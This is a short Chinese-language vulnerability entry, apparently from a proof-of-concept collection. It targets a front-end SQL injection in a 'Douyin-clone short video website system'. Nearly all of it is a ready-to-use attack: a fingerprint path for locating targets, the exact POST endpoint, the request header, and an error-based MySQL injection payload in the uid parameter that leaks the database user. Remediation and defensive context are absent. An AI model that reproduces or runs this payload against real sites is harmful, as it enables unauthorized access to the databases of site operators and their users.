# 仿抖音短视频网站系统index存在前台SQL注入漏洞

- **系统**：仿抖音短视频网站系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"/public/index/images/new_logo.png"`
- **请求**：`POST /index.php?g=appapi&m=auth&a=success HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencode`

**请求体 / payload**
```
uid=(SELECT 7052 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```
- **预期**：200　|　—